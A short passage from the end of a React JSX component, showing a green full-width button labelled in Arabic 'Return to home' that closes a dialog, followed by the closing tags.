            <Button onClick={closeDialog} className="w-full bg-green-600 hover:bg-green-700">
              العودة للرئيسية
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
